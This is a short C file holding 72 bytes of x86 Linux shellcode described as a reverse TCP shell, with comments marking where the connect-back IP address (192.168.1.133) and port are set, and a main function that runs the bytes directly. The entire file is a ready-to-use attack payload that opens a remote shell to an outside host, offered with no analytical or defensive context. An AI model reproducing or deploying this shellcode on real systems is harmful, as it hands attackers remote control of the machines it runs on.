/* 
	Reverse TCP shell (72 bytes) 
	Connects to 192.168.1.133:33333 by default.
*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x6a\x66\x58\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1\xcd\x80\x93\x89\xd1\xb0"
"\x3f\xcd\x80\x49\x79\xf9\xb0\x66\x87\xda\x68"
"\xc0\xa8\x01\x85"	// <-- ip address
"\x66\x68"
"\x82\x35"			// <--- tcp port
"\x66\x53\x43\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\x6a\x0b\x58\x99\x89\xd1"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80";

int main(void) {
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}